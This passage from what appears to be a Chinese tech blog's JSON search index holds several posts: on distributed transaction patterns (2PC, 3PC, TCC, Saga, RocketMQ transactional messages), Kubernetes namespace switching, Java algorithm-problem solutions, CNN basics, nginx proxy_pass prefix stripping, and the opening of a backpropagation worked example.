2PC。\n还有一点不知道你们看出来没，2PC 适用于数据库层面的分布式事务场景，而我们业务需求有时候不仅仅关乎数据库，也有可能是上传一张图片或者发送一条短信。\n而且像 Java 中的 JTA 只能解决一个应用下多数据库的分布式事务问题，跨服务了就不能用了。\n简单说下 Java 中 JTA，它是基于XA规范实现的事务接口，这里的 XA 你可以简单理解为基于数据库的 XA 规范来实现的 2PC。\n 3PC 3PC 的出现是为了解决 2PC 的一些问题，相比于 2PC 它在参与者中也引入了超时机制，并且新增了一个阶段使得参与者可以利用这一个阶段统一各自的状态。\n让我们来详细看一下。\n3PC 包含了三个阶段，分别是**准备阶段、预提交阶段、提交阶段**，对应的英文就是：CanCommit、PreCommit 、 DoCommit。\n看起来是把 2PC 的提交阶段变成了预提交阶段和提交阶段，但是 3PC 的准备阶段协调者只是询问参与者的自身状况，比如你现在还好吗？负载重不重？这类的。\n而预提交阶段就是和 2PC 的准备阶段一样，除了事务的提交该做的都做了。\n提交阶段和 2PC 的一样，让我们来看一下图。\n不管哪一个阶段有参与者返回失败都会宣布事务失败，这和 2PC 是一样的（当然到最后的提交阶段和 2PC 一样只要是提交请求就只能不断重试）。\n我们先来看一下 3PC 的阶段变更有什么影响。\n首先准备阶段的变更成不会直接执行事务，而是会先去询问此时的参与者是否有条件接这个事务，因此不会一来就干活直接锁资源，使得在某些资源不可用的情况下所有参与者都阻塞着。\n而预提交阶段的引入起到了一个统一状态的作用，它像一道栅栏，表明在预提交阶段前所有参与者其实还未都回应，在预处理阶段表明所有参与者都已经回应了。\n假如你是一位参与者，你知道自己进入了预提交状态那你就可以推断出来其他参与者也都进入了预提交状态。\n但是多引入一个阶段也多一个交互，因此性能会差一些，而且绝大部分的情况下资源应该都是可用的，这样等于每次明知可用执行还得询问一次。\n我们再来看下参与者超时能带来什么样的影响。\n我们知道 2PC 是同步阻塞的，上面我们已经分析了协调者挂在了提交请求还未发出去的时候是最伤的，所有参与者都已经锁定资源并且阻塞等待着。\n那么引入了超时机制，参与者就不会傻等了，如果是等待提交命令超时，那么参与者就会提交事务了，因为都到了这一阶段了大概率是提交的，如果是等待预提交命令超时，那该干啥就干啥了，反正本来啥也没干。\n然而超时机制也会带来数据不一致的问题，比如在等待提交命令时候超时了，参与者默认执行的是提交事务操作，但是有可能执行的是回滚操作，这样一来数据就不一致了。\n当然 3PC 协调者超时还是在的，具体不分析了和 2PC 是一样的。\n从维基百科上看，3PC 的引入是为了解决提交阶段 2PC 协调者和某参与者都挂了之后新选举的协调者不知道当前应该提交还是回滚的问题。\n新协调者来的时候发现有一个参与者处于预提交或者提交阶段，那么表明已经经过了所有参与者的确认了，所以此时执行的就是提交命令。\n所以说 3PC 就是通过引入预提交阶段来使得参与者之间的状态得到统一，也就是留了一个阶段让大家同步一下。\n但是这也只能让协调者知道该如果做，但不能保证这样做一定对，这其实和上面 2PC 分析一致，因为挂了的参与者到底有没有执行事务无法断定。\n所以说 3PC 通过预提交阶段可以减少故障恢复时候的复杂性，但是不能保证数据一致，除非挂了的那个参与者恢复。\n让我们总结一下， 3PC 相对于 2PC 做了一定的改进：\n   引入了参与者超时机制\n  准备阶段不执行事务，不锁定资源，只是询问参与者状态，不至于使得在某些参与者资源不可用的情况下所有参与者都阻塞着。\n  增加了预提交阶段使得故障恢复之后协调者的决策复杂度降低\n但整体的交互过程更长了，性能有所下降，并且还是会存在数据不一致问题。\n   所以 2PC 和 3PC 都不能保证数据100%一致，因此一般都需要有定时扫描补偿机制。\n我再说下 3PC 我没有找到具体的实现，所以我认为 3PC 只是纯的理论上的东西，而且可以看到相比于 2PC 它是做了一些努力但是效果甚微，所以只做了解即可。\nTCC 2PC 和 3PC 都是数据库层面的，而 TCC 是业务层面的分布式事务，就像我前面说的分布式事务不仅仅包括数据库的操作，还包括发送短信等，这时候 TCC 就派上用场了！\nTCC 指的是Try - Confirm - Cancel。\n Try 指的是预留，即资源的预留和锁定，注意是预留。 Confirm 指的是确认操作，这一步其实就是真正的执行了。 Cancel 指的是撤销操作，可以理解为把预留阶段的动作撤销了。  其实从思想上看和 2PC 差不多，都是先试探性的执行，如果都可以那就真正的执行，如果不行就回滚。\n比如说一个事务要执行A、B、C三个操作，那么先对三个操作执行预留动作。如果都预留成功了那么就执行确认操作，如果有一个预留失败那就都执行撤销动作。\n我们来看下流程，TCC模型还有个事务管理者的角色，用来记录TCC全局事务状态并提交或者回滚事务。\n可以看到流程还是很简单的，难点在于业务上的定义，对于每一个操作你都需要定义三个动作分别对应Try - Confirm - Cancel。\n因此 TCC 对业务的侵入较大和业务紧耦合，需要根据特定的场景和业务逻辑来设计相应的操作。\n还有一点要注意，撤销和确认操作的执行可能需要重试，因此还需要保证操作的幂等。\n相对于 2PC、3PC ，TCC 适用的范围更大，但是开发量也更大，毕竟都在业务上实现，而且有时候你会发现这三个方法还真不好写。不过也因为是在业务上实现的，所以TCC可以跨数据库、跨不同的业务系统来实现事务。\n本地消息表 本地消息表其实就是利用了 各系统本地的事务来实现分布式事务。\n本地消息表顾名思义就是会有一张存放本地消息的表，一般都是放在数据库中，然后在执行业务的时候 将业务的执行和将消息放入消息表中的操作放在同一个事务中，这样就能保证消息放入本地表中业务肯定是执行成功的。\n然后再去调用下一个操作，如果下一个操作调用成功了好说，消息表的消息状态可以直接改成已成功。\n如果调用失败也没事，会有 后台任务定时去读取本地消息表，筛选出还未成功的消息再调用对应的服务，服务更新成功了再变更消息的状态。\n这时候有可能消息对应的操作不成功，因此也需要重试，重试就得保证对应服务的方法是幂等的，而且一般重试会有最大次数，超过最大次数可以记录下报警让人工处理。\n可以看到本地消息表其实实现的是最终一致性，容忍了数据暂时不一致的情况。\n 本地消息表应用得相当广泛，除了上面的最终一致性方式，本地消息一般还可以这样实现：\n例如保存订单数据的同时需要调用支付接口：\n 保存订单的时候将其状态设置为“待生效” 调用支付成功则更新订单状态 👉 “已生效”，调用失败则提示用户稍后再试  这个过程需要支付接口具备幂等性\n 消息事务 RocketMQ 就很好的支持了消息事务，让我们来看一下如何通过消息实现事务。\n第一步先给 Broker 发送事务消息即半消息，半消息不是说一半消息，而是这个消息对消费者来说不可见，然后发送成功后发送方再执行本地事务。\n再根据本地事务的结果向 Broker 发送 Commit 或者 RollBack 命令。\n并且 RocketMQ 的发送方会提供一个反查事务状态接口，如果一段时间内半消息没有收到任何操作请求，那么 Broker 会通过反查接口得知发送方事务是否执行成功，然后执行 Commit 或者 RollBack 命令。\n如果是 Commit 那么订阅方就能收到这条消息，然后再做对应的操作，做完了之后再消费这条消息即可。\n如果是 RollBack 那么订阅方收不到这条消息，等于事务就没执行过。\n可以看到通过 RocketMQ 还是比较容易实现的，RocketMQ 提供了事务消息的功能，我们只需要定义好事务反查接口即可。\n可以看到消息事务实现的也是最终一致性。\n最大努力通知 其实我觉得本地消息表也可以算最大努力，事务消息也可以算最大努力。\n就本地消息表来说会有后台任务定时去查看未完成的消息，然后去调用对应的服务，当一个消息多次调用都失败的时候可以记录下然后引入人工，或者直接舍弃。这其实算是最大努力了。\n事务消息也是一样，当半消息被commit了之后确实就是普通消息了，如果订阅者一直不消费或者消费不了则会一直重试，到最后进入死信队列。其实这也算最大努力。\n所以最大努力通知其实只是表明了一种柔性事务的思想：我已经尽力我最大的努力想达成事务的最终一致了。\n适用于对时间不敏感的业务，例如短信通知。\nSaga 在Saga模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败则补偿前面已经成功的参与者，一阶段正向服务和二阶段补偿服务都由业务开发实现。\n适用场景：  业务流程长、业务流程多 参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口  优势：  一阶段提交本地事务，无锁，高性能 事件驱动架构，参与者可异步执行，高吞吐 补偿服务易于实现  缺点：  不保证隔离性  总结 可以看出 2PC 和 3PC 是一种强一致性事务，不过还是有数据不一致，阻塞等风险，而且只能用在数据库层面。\n而 TCC 是一种补偿性事务思想，适用的范围更广，在业务层面实现，因此对业务的侵入性较大，每一个操作都需要实现对应的三个方法。\n本地消息、事务消息和最大努力通知其实都是最终一致性事务，因此适用于一些对时间不敏感的业务。\n参考 面试必问：分布式事务六种解决方案 Seata 再有人问你分布式事务，把这篇扔给他 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/distributed/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/","series":["Manual"],"tags":["分布式","CS"],"title":"分布式事务"},{"categories":["云原生"],"content":"切换namespace\n0. 背景 k8s如何切换namespace？？而不必每次执行命令的时候在后面指定namespace？k8s并没有直接提供切换namespace的命令。不过可以通过：\n 切换context达到切换namespace的目的，这需要提前创建好context和namespace的绑定关系（如：kubectl config set-context test --namespace=test）,然后使用 kubectl config use-context test 切换context，从而间接的达到切换namespace的目的。这方法属实是太别扭了，强迫症患者都不喜欢。 或者使用kubectx工具，其本质是动态的修改context和namespace的绑定关系。使用形如：kubens test 即可切换。这样才是切换namespace的正确打开方式，优雅多了。  参考资料： Kubernetes命名空间 一条命令解决Kubernetes更改默认的namespace Kubernetes 切换context和namespace k8s集群namespace和context使用 ahmetb / kubectx 提高您的kubectl生产力（第三部分）：集群上下文切换、使用别名减少输入和插件扩展 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E5%88%87%E6%8D%A2namespace/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"切换namespace"},{"categories":["编程思想"],"content":"class CQueue { Stack\u0026lt;Integer\u0026gt; stack1; Stack\u0026lt;Integer\u0026gt; stack2; public CQueue() { stack1 = new Stack(); stack2 = new Stack(); } public void appendTail(int value) { stack1.push(value); } public int deleteHead() { if(stack2.isEmpty()){ while(stack1.isEmpty() == false){ stack2.push(stack1.pop()); } } if(stack2.isEmpty()){ return -1; }else{ return stack2.pop(); } } } /** * Your CQueue object will be instantiated and called as such: * CQueue obj = new CQueue(); * obj.appendTail(value); * int param_2 = obj.deleteHead(); */ 剑指 Offer 09. 用两个栈实现队列 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-09.-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 09. 用两个栈实现队列"},{"categories":["编程思想"],"content":"class Solution { public ListNode deleteNode(ListNode head, int val) { ListNode myHead = new ListNode(-1); myHead.next = head; ListNode pos1 = head; ListNode pos2 = myHead; //定位  while (pos1.val != val) { pos2 = pos1; pos1 = pos1.next; } //删除  pos2.next = pos1.next; return myHead.next; } } 剑指 Offer 18. 删除链表的节点 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-18.-%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%9A%84%E8%8A%82%E7%82%B9/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 18. 删除链表的节点"},{"categories":["编程思想"],"content":"剑指 Offer 27. 二叉树的镜像 /** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public TreeNode mirrorTree(TreeNode root) { if(root == null){ return root; } //TreeNode posL = root.left;  //TreeNode posR = root.right;  //root.left = posR;  //root.right = posL;  TreeNode tmp = null; tmp = root.left; root.left = root.right; root.right = tmp; mirrorTree(root.left); mirrorTree(root.right); return root; } } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-27.-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 27. 二叉树的镜像"},{"categories":["编程思想"],"content":"/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public boolean isSymmetric(TreeNode root) { if(root == null){return true;} return isSymmetric2(root.left, root.right); } private boolean isSymmetric2(TreeNode left, TreeNode right){ if (left == null \u0026amp;\u0026amp; right == null){return true;} if ((left == null \u0026amp;\u0026amp; right != null) || (left !=null \u0026amp;\u0026amp; right == null)){ return false; } if (left.val == right.val){ return isSymmetric2(left.left, right.right) \u0026amp;\u0026amp; isSymmetric2(left.right, right.left); } return false; } } 剑指 Offer 28. 对称的二叉树 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-28.-%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 28. 对称的二叉树"},{"categories":["编程思想"],"content":"剑指 Offer 30. 包含min函数的栈 class MinStack { Stack\u0026lt;Integer\u0026gt; stack1; Stack\u0026lt;Integer\u0026gt; stack2; /** initialize your data structure here. */ public MinStack() { stack1 = new Stack(); stack2 = new Stack(); } public void push(int x) { stack1.push(x); if(stack2.isEmpty()){ stack2.push(x); }else if(x \u0026gt; stack2.peek()){ stack2.push(stack2.peek()); }else{ stack2.push(x); } } public void pop() { stack1.pop(); stack2.pop(); } public int top() { return stack1.peek(); } public int min() { return stack2.peek(); } } /** * Your MinStack object will be instantiated and called as such: * MinStack obj = new MinStack(); * obj.push(x); * obj.pop(); * int param_3 = obj.top(); * int param_4 = obj.min(); */ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-30.-%E5%8C%85%E5%90%ABmin%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 30. 包含min函数的栈"},{"categories":["编程思想"],"content":"/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ class Solution { public static int[] levelOrder(TreeNode root) { ArrayList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;Integer\u0026gt;(); if (root == null) { return new int[]{}; } Queue\u0026lt;TreeNode\u0026gt; queue=new LinkedList\u0026lt;TreeNode\u0026gt;(); queue.add(root); while(!queue.isEmpty()){ TreeNode node=queue.poll(); list.add(node.val); if(node.left!=null){ queue.add(node.left); } if(node.right!=null){ queue.add(node.right); } } //list.stream().mapToInt(Integer::intValue).toArray();  int[] res = new int[list.size()]; for (int i = 0; i \u0026lt; list.size(); i++) { res[i] = list.get(i); } return res; } } 剑指 Offer 32 - I. 从上到下打印二叉树 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-32-i.-%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 32 - I. 从上到下打印二叉树"},{"categories":["编程思想"],"content":"剑指 Offer 32 - II. 从上到下打印二叉树 II class Solution { public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; levelOrder(TreeNode root) { Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); if(root != null) queue.add(root); while(!queue.isEmpty()) { List\u0026lt;Integer\u0026gt; tmp = new ArrayList\u0026lt;\u0026gt;(); for(int i = queue.size(); i \u0026gt; 0; i--) { TreeNode node = queue.poll(); tmp.add(node.val); if(node.left != null) queue.add(node.left); if(node.right != null) queue.add(node.right); } res.add(tmp); } return res; } } 这种方法，要用到两个队列，但是思路比较清晰，也记录一下\nclass Solution { LinkedList\u0026lt;TreeNode\u0026gt; queue1 = new LinkedList\u0026lt;\u0026gt;(); LinkedList\u0026lt;TreeNode\u0026gt; queue2 = new LinkedList\u0026lt;\u0026gt;(); public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; levelOrder(TreeNode root) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); if (root != null) { queue1.add(root); } while (!queue1.isEmpty()) { List\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); while (!queue1.isEmpty()) { TreeNode node = queue1.poll(); list.add(node.val); if (node.left != null) { queue2.add(node.left); } if (node.right != null) { queue2.add(node.right); } } res.add(list); LinkedList\u0026lt;TreeNode\u0026gt; tmp = queue1; queue1 = queue2; queue2 = tmp; } return res; } } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-32-ii.-%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91-ii/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 32 - II. 从上到下打印二叉树 II"},{"categories":["编程思想"],"content":"剑指 Offer 32 - III. 从上到下打印二叉树 III /** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; levelOrder(TreeNode root) { LinkedList\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); if (root != null){ queue.add(root); } List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); while (!queue.isEmpty()) { LinkedList\u0026lt;Integer\u0026gt; deque = new LinkedList\u0026lt;\u0026gt;(); for (int i = queue.size(); i \u0026gt; 0; i--) { TreeNode node = queue.poll(); if (res.size() % 2 == 0) { deque.addLast(node.val); } else { deque.addFirst(node.val); } if (node.left != null) { queue.add(node.left); } if (node.right != null) { queue.add(node.right); } } res.add(deque); } return res; } } package com.xzj; import java.util.*; /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ class Solution { public static List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; levelOrder(TreeNode root) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); if (root == null){return res;} Stack\u0026lt;TreeNode\u0026gt; stack1 = new Stack(); Stack\u0026lt;TreeNode\u0026gt; stack2 = new Stack(); stack1.push(root); while (stack1.isEmpty() == false || stack2.isEmpty() == false){ List\u0026lt;Integer\u0026gt; sub = new ArrayList(); while (stack1.isEmpty() == false){ TreeNode node = stack1.pop(); sub.add(node.val); if (node.left != null){ stack2.push(node.left); } if (node.right != null){ stack2.push(node.right); } } if (sub.isEmpty() == false){ res.add(sub); } sub = new ArrayList(); while (stack2.isEmpty() == false){ TreeNode node = stack2.pop(); sub.add(node.val); if (node.right != null){ stack1.push(node.right); } if (node.left != null){ stack1.push(node.left); } } if (sub.isEmpty() == false){ res.add(sub); } } return res; } public static void main(String[] args) { TreeNode node1 = new TreeNode(3); TreeNode node2 = new TreeNode(9); TreeNode node3 = new TreeNode(20); TreeNode node4 = new TreeNode(15); TreeNode node5 = new TreeNode(7); node1.left = node2; node1.right = node3; node3.left = node4; node3.right = node5; System.out.println(levelOrder(node1)); System.out.println((7 \u0026amp; 8)); System.out.println(0 / 2); } } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-32-iii.-%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91-iii/","series":["算法"],"tags":["剑指offer"],"title":"剑指 Offer 32 - III. 从上到下打印二叉树 III"},{"categories":["人工智能"],"content":"在 CNN 出现之前，图像对于人工智能来说是一个难题，有2个原因：\n 图像需要处理的数据量太大，导致成本很高，效率很低 图像在数字化的过程中很难保留原有的特征，导致图像处理的准确率不高  下面就详细说明一下这2个问题：\n需要处理的数据量太大 图像是由像素构成的，每个像素又是由颜色构成的。\n现在随随便便一张图片都是 1000×1000 像素以上的， 每个像素都有RGB 3个参数来表示颜色信息。\n假如我们处理一张 1000×1000 像素的图片，我们就需要处理3百万个参数！\n1000×1000×3=3,000,000\n这么大量的数据处理起来是非常消耗资源的，而且这只是一张不算太大的图片！\n卷积神经网络 – CNN 解决的第一个问题就是「将复杂问题简化」，把大量参数降维成少量参数，再做处理。\n更重要的是：我们在大部分场景下，降维并不会影响结果。比如1000像素的图片缩小成200像素，并不影响肉眼认出来图片中是一只猫还是一只狗，机器也是如此。\n保留图像特征 图片数字化的传统方式我们简化一下，就类似下图的过程：\n假如有圆形是1，没有圆形是0，那么圆形的位置不同就会产生完全不同的数据表达。但是从视觉的角度来看，图像的内容（本质）并没有发生变化，只是位置发生了变化。\n所以当我们移动图像中的物体，用传统的方式的得出来的参数会差异很大！这是不符合图像处理的要求的。\n而 CNN 解决了这个问题，他用类似视觉的方式保留了图像的特征，当图像做翻转，旋转或者变换位置时，它也能有效的识别出来是类似的图像。\n那么卷积神经网络是如何实现的呢？在我们了解 CNN 原理之前，先来看看人类的视觉原理是什么？\n1. 人类的视觉原理 深度学习的许多研究成果，离不开对大脑认知原理的研究，尤其是视觉原理的研究。\n1981 年的诺贝尔医学奖，颁发给了 David Hubel（出生于加拿大的美国神经生物学家） 和TorstenWiesel，以及 Roger Sperry。前两位的主要贡献，是“发现了视觉系统的信息处理”，可视皮层是分级的。\n人类的视觉原理如下：从原始信号摄入开始（瞳孔摄入像素 Pixels），接着做初步处理（大脑皮层某些细胞发现边缘和方向），然后抽象（大脑判定，眼前的物体的形状，是圆形的），然后进一步抽象（大脑进一步判定该物体是只气球）。下面是人脑进行人脸识别的一个示例：\n对于不同的物体，人类视觉也是通过这样逐层分级，来进行认知的：\n我们可以看到，在最底层特征基本上是类似的，就是各种边缘，越往上，越能提取出此类物体的一些特征（轮子、眼睛、躯干等），到最上层，不同的高级特征最终组合成相应的图像，从而能够让人类准确的区分不同的物体。\n那么我们可以很自然的想到：可以不可以模仿人类大脑的这个特点，构造多层的神经网络，较低层的识别初级的图像特征，若干底层特征组成更上一层特征，最终通过多个层级的组合，最终在顶层做出分类呢？\n答案是肯定的，这也是许多深度学习算法（包括CNN）的灵感来源。\n2. 卷积神经网络-CNN 的基本原理 典型的 CNN 由3个部分构成：\n 卷积层 池化层 全连接层  如果简单来描述的话：卷积层负责提取图像中的局部特征；池化层用来大幅降低参数量级(降维)；全连接层类似传统神经网络的部分，用来输出想要的结果。\n下面的原理解释为了通俗易懂，忽略了很多技术细节，如果大家对详细的原理感兴趣，可以看这个视频《卷积神经网络基础 》。\n2.1 卷积——提取特征 卷积层的运算过程如下图，用一个卷积核扫完整张图片：\n这个过程我们可以理解为我们使用一个过滤器（卷积核）来过滤图像的各个小区域，从而得到这些小区域的特征值。\n在具体应用中，往往有多个卷积核，可以认为，每个卷积核代表了一种图像模式，如果某个图像块与此卷积核卷积出的值大，则认为此图像块十分接近于此卷积核。如果我们设计了6个卷积核，可以理解：我们认为这个图像上有6种底层纹理模式，也就是我们用6中基础模式就能描绘出一副图像。以下就是25种不同的卷积核的示例：\n总结：卷积层的通过卷积核的过滤提取出图片中局部的特征，跟上面提到的人类视觉的特征提取类似。\n2.2 池化层（下采样）——数据降维，避免过拟合 池化层简单说就是下采样，他可以大大降低数据的维度。其过程如下：\n上图中，我们可以看到，原始图片是20×20的，我们对其进行下采样，采样窗口为10×10，最终将其下采样成为一个2×2大小的特征图。\n之所以这么做的原因，是因为即使做完了卷积，图像仍然很大（因为卷积核比较小），所以为了降低数据维度，就进行下采样。\n总结：池化层相比卷积层可以更有效的降低数据维度，这么做不但可以大大减少运算量，还可以有效的避免过拟合。\n2.3 全连接层——输出结果 这个部分就是最后一步了，经过卷积层和池化层处理过的数据输入到全连接层，得到最终想要的结果。\n经过卷积层和池化层降维过的数据，全连接层才能”跑得动”，不然数据量太大，计算成本高，效率低下。\n典型的 CNN 并非只是上面提到的3层结构，而是多层结构，例如 LeNet-5 的结构就如下图所示：\n卷积层 – 池化层- 卷积层 – 池化层 – 卷积层 – 全连接层\n3. 总结 今天我们介绍了 CNN 的价值、基本原理和应用场景，简单总结如下：\nCNN 的价值：\n 能够将大数据量的图片有效的降维成小数据量(并不影响结果) 能够保留图片的特征，类似人类的视觉原理  CNN 的基本原理：\n 卷积层 – 主要作用是保留图片的特征 池化层 – 主要作用是把数据降维，可以有效的避免过拟合 全连接层 – 根据不同任务输出我们想要的结果  CNN 的实际应用：\n图像分类、检索\n图像分类是比较基础的应用，他可以节省大量的人工成本，将图像进行有效的分类。对于一些特定领域的图片，分类的准确率可以达到 95%+，已经算是一个可用性很高的应用了。\n典型场景：图像搜索…\n目标定位检测\n可以在图像中定位目标，并确定目标的位置及大小。\n典型场景：自动驾驶、安防、医疗…\n目标分割\n简单理解就是一个像素级的分类。\n他可以对前景和背景进行像素级的区分、再高级一点还可以识别出目标并且对目标进行分类。\n典型场景：美图秀秀、视频后期加工、图像生成…\n人脸识别\n人脸识别已经是一个非常普及的应用了，在很多领域都有广泛的应用。\n典型场景：安防、金融、生活…\n骨骼识别\n骨骼识别是可以识别身体的关键骨骼，以及追踪骨骼的动作。\n典型场景：安防、电影、图像视频生成、游戏…\n参考 卷积神经网络 – CNN ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/ai/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9Ccnn/","series":["Manual"],"tags":["CNN","AI"],"title":"卷积神经网络"},{"categories":["编程思想"],"content":"1. proxy_pass后面加根路径/ location ^~/user/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-NginX-Proxy true; proxy_pass http://user/; } ^~/user/表示匹配前缀是user的请求，proxy_pass的结尾有/， 则会把/user/*后面的路径直接拼接到后面，即移除user。\n2. 使用rewrite location ^~/user/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-NginX-Proxy true; rewrite ^/user/(.*)$ /$1 break; proxy_pass http://user; } 注意到proxy_pass结尾没有/， rewrite重写了url。\n参考链接： Nginx代理proxy pass配置去除前缀 Nginx 转发域名地址报 400 Bad Request ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/%E5%8E%BB%E9%99%A4%E8%AF%B7%E6%B1%82path%E5%89%8D%E7%BC%80/","series":["Manual"],"tags":["nginx"],"title":"去除请求path前缀"},{"categories":["人工智能"],"content":"说到神经网络，大家看到这个图应该不陌生：\n这是典型的三层神经网络的基本构成，Layer L1是输入层，Layer L2是隐含层，Layer L3是隐含层，我们现在手里有一堆数据{x1,x2,x3,\u0026hellip;,xn},输出也是一堆数据{y1,y2,y3,\u0026hellip;,yn},现在要他们在隐含层做某种变换，让你把数据灌进去后得到你期望的输出。如果你希望你的输出和原始输入一样，那么就是最常见的自编码模型（Auto-Encoder）。可能有人会问，为什么要输入输出都一样呢？有什么用啊？其实应用挺广的，在图像识别，文本分类等等都会用到，我会专门再写一篇Auto-Encoder的文章来说明，包括一些变种之类的。如果你的输出和原始输入不一样，那么就是很常见的人工神经网络了，相当于让原始数据通过一个映射来得到我们想要的输出数据，也就是我们今天要讲的话题。\n本文直接举一个例子，带入数值演示反向传播法的过程，公式的推导等到下次写Auto-Encoder的时候再写，其实也很简单，感兴趣的同学可以自己推导下试试：）（注：本文假设你已经懂得基本的神经网络构成，如果完全不懂，可以参考Poll写的笔记：[Mechine Learning \u0026amp; Algorithm] 神经网络基础 ）\n假设，你有这样一个网络层：\n第一层是输入层，包含两个神经元i1，i2，和截距项b1；第二层是隐含层，包含两个神经元h1,h2和截距项b2，第三层是输出o1,o2，每条线上标的wi是层与层之间连接的权重，激活函数我们默认为sigmoid函数。\n现在对他们赋上初值，如下图：\n其中，输入数据 i1=0.05，i2=0.10;\n　输出数据 o1=0.01,o2=0.99;\n　初始权重 w1=0.15,w2=0.20,w3=0.25,w4=0.30;\n　w5=0.40,w6=0.45,w7=0.50,w8=0.55\n目标：给出输入数据i1,i2(0.05和0.10)，使输出尽可能与原始输出o1,o2(0.01和0.99)接近。\nStep 1 前向传播\n1.输入层\u0026mdash;-\u0026gt;隐含层：\n计算神经元h1的输入加权和： $$ \\begin{array}{l} n e t_{h 1}=w_{1} * i_{1}+w_{2} * i_{2}+b_{1} * 1 \\\n{ net }_{h 1}=0.15 * 0.05+0.2 * 0.1+0.35 * 1=0.3775 \\end{array} $$ 神经元h1的输出o1:(此处用到激活函数为sigmoid函数)： $$ { out }_{h 1}=\\frac{1}{1+e^{-n e t_{h 1}}}=\\frac{1}{1+e^{-0.3775}}=0.593269992 $$ 同理，可计算出神经元h2的输出o2： $$ { out }_{h 2}=0.596884378 